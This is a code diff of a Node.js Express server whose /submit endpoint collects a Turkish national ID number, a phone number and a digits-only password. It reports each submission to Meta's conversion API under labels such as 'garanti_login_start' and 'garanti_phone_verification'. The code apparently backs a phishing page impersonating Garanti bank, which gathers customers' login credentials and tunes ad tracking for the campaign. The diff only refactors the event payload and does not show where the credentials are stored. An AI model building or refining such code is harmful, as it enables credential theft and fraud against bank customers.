@@ -1,4 +1,3 @@
-// server.js
 const express = require('express');
 const axios = require('axios');
 const crypto = require('crypto');
@@ -60,21 +59,20 @@ const sendToMetaWithRetry = async (payload, maxRetries = 3) => {
 };
 
 app.post('/submit', async (req, res) => {
-  const {
-    tc, phone, password, eventID, initEventID, initEventTime,
-    fbp, fbc, completeEventID, completeEventTime
-  } = req.body;
+  const { tc, phone, password, eventID, initEventID, fbp, fbc } = req.body;
 
   if (!tc || !phone || !password || !eventID) {
     return res.status(400).json({ error: 'TC, telefon, şifre ve eventID zorunlu.' });
   }
 
   if (!/^\d{11}$/.test(tc)) {
-    return res.status(400).json({ error: 'Geçersiz TC Kimlik Numarası.' });
+    return res.status(400).json({ error: 'Geçersiz TC Kimlik Numarası. 11 haneli ve sadece rakamlardan oluşmalı.' });
   }
+
   if (!/^5\d{9}$/.test(phone)) {
-    return res.status(400).json({ error: 'Geçersiz telefon numarası.' });
+    return res.status(400).json({ error: 'Geçersiz telefon numarası. 10 haneli olmalı, 5 ile başlamalı (örnek: 5551234567).' });
   }
+
   if (!/^\d+$/.test(password)) {
     return res.status(400).json({ error: 'Şifre sadece rakamlardan oluşmalı.' });
   }
@@ -90,16 +88,13 @@ app.post('/submit', async (req, res) => {
     const normalizedPhone = `+90${phone}`;
     const hashData = (data) => crypto.createHash('sha256').update(data.toLowerCase().trim()).digest('hex');
     const hashedPhone = hashData(normalizedPhone);
-
     const cookies = parseCookie(req.headers.cookie);
-    let fbcValue = fbc || cookies._fbc;
-    if (!fbcValue && req.query.fbclid) {
-      const creationTime = Math.floor(Date.now() / 1000);
-      fbcValue = `fb.1.${creationTime}.${req.query.fbclid}`;
-    }
 
-    const fbpValue = fbp && /^fb\.1\.\d+\.\d+$/.test(fbp)
-      ? fbp
+    // FBC: SADECE body.fbc veya cookie._fbc → %100 GÜVENLİ
+    const fbcValue = fbc || cookies._fbc;
+
+    const fbpValue = fbp && /^fb\.1\.\d+\.\d+$/.test(fbp) 
+      ? fbp 
       : (cookies._fbp && /^fb\.1\.\d+\.\d+$/.test(cookies._fbp) ? cookies._fbp : undefined);
 
     const userData = {
@@ -113,64 +108,40 @@ app.post('/submit', async (req, res) => {
     const currentHost = req.headers['x-forwarded-host'] || req.headers['host'] || 'fallback-domain.com';
     const protocol = req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
 
-    const events = [];
-
-    // InitiateCheckout
-    if (initEventID && initEventTime) {
-      events.push({
-        event_name: 'InitiateCheckout',
-        event_time: initEventTime,
-        action_source: 'website',
-        event_source_url: `${protocol}://${currentHost}/`,
-        event_id: initEventID,
-        user_data: userData,
-        custom_data: {
-          content_category: 'garanti_credit_form_start',
-          content_name: 'garanti_login_start',
-          value: 0.5,
-          currency: 'TRY'
+    const payload = {
+      data: [
+        ...(initEventID ? [{
+          event_name: 'InitiateCheckout',
+          event_time: now - 10,
+          action_source: 'website',
+          event_source_url: `${protocol}://${currentHost}/`,
+          event_id: initEventID,
+          user_data: userData,
+          custom_data: {
+            content_category: 'garanti_credit_form_start',
+            content_name: 'garanti_login_start',
+            value: 0.5,
+            currency: 'TRY'
+          },
+        }] : []),
+        {
+          event_name: 'Lead',
+          event_time: now,
+          action_source: 'website',
+          event_source_url: `${protocol}://${currentHost}/telefon`,
+          event_id: eventID,
+          user_data: userData,
+          custom_data: {
+            content_category: 'garanti_lead_form',
+            content_name: 'garanti_phone_verification',
+            value: 1,
+            currency: 'TRY'
+          },
         },
-      });
-    }
+      ].filter(Boolean),
+    };
 
-    // Lead
-    events.push({
-      event_name: 'Lead',
-      event_time: now,
-      action_source: 'website',
-      event_source_url: `${protocol}://${currentHost}/telefon`,
-      event_id: eventID,
-      user_data: userData,
-      custom_data: {
-        content_category: 'garanti_lead_form',
-        content_name: 'garanti_phone_verification',
-        value: 1,
-        currency: 'TRY'
-      },
-    });
-
-    // CompleteRegistration
-    if (completeEventID && completeEventTime) {
-      events.push({
-        event_name: 'CompleteRegistration',
-        event_time: completeEventTime,
-        action_source: 'website',
-        event_source_url: `${protocol}://${currentHost}/bekleme`,
-        event_id: completeEventID,
-        user_data: userData,
-        custom_data: {
-          content_name: 'garanti_form_submission_completed',
-          content_category: 'garanti_credit_form',
-          value: 2.0,
-          currency: 'TRY'
-        },
-      });
-    }
-
-    if (events.length > 0) {
-      const payload = { data: events };
-      await sendToMetaWithRetry(payload);
-    }
+    await sendToMetaWithRetry(payload);
 
     res.json({ message: 'Gönderildi.' });
   } catch (error) {
@@ -193,4 +164,4 @@ module.exports = app;
 if (process.env.NODE_ENV !== 'production') {
   const port = process.env.PORT || 3001;
   app.listen(port, () => console.log(`Yerel sunucu: http://localhost:${port}`));
-}
+} 
